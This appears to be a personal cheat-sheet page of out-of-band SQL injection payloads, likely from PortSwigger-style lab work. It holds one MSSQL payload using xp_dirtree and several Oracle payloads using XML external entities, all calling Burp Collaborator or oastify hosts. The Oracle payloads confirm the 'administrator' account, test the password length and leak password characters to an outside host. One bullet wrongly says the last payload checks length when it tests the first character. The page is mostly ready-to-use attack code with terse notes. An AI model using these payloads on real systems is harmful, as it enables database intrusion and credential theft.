---
tags:
  - web
  - security
---
# MSSQL
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
- Looks up `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
# Oracle
```
'||(SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN (select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+yvrne+SYSTEM+"http%3a//temp.yfh43prxtlz0sa3tkqg6oaur5ib9zanz'||'.oastify.com/">%25yvrne%3b]>'),'/l')+from+dual) ELSE 'b' END FROM dual)||'
```
- Checks if user exists
```
'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='a') THEN (select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+yvrne+SYSTEM+"http%3a//daniel.69dcxxl5ntt8mix1eyaeiiozzq5hthh6'||'.oastify.com/">%25yvrne%3b]>'),'/l')+from+dual) ELSE (select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+yvrne+SYSTEM+"http%3a//fail.69dcxxl5ntt8mix1eyaeiiozzq5hthh6'||'.oastify.com/">%25yvrne%3b]>'),'/l')+from+dual) END FROM dual)||'
```
- Checks password length
- Sends fail.domain if failed
- Sends daniel.domain if success

```
'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1) = 'z')='a') THEN (select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+yvrne+SYSTEM+"http%3a//z.69dcxxl5ntt8mix1eyaeiiozzq5hthh6'||'.oastify.com/">%25yvrne%3b]>'),'/l')+from+dual) ELSE ('b') END FROM dual)||'
```
- Checks password length
- Sends z.domain if success
- Sends nothing if failed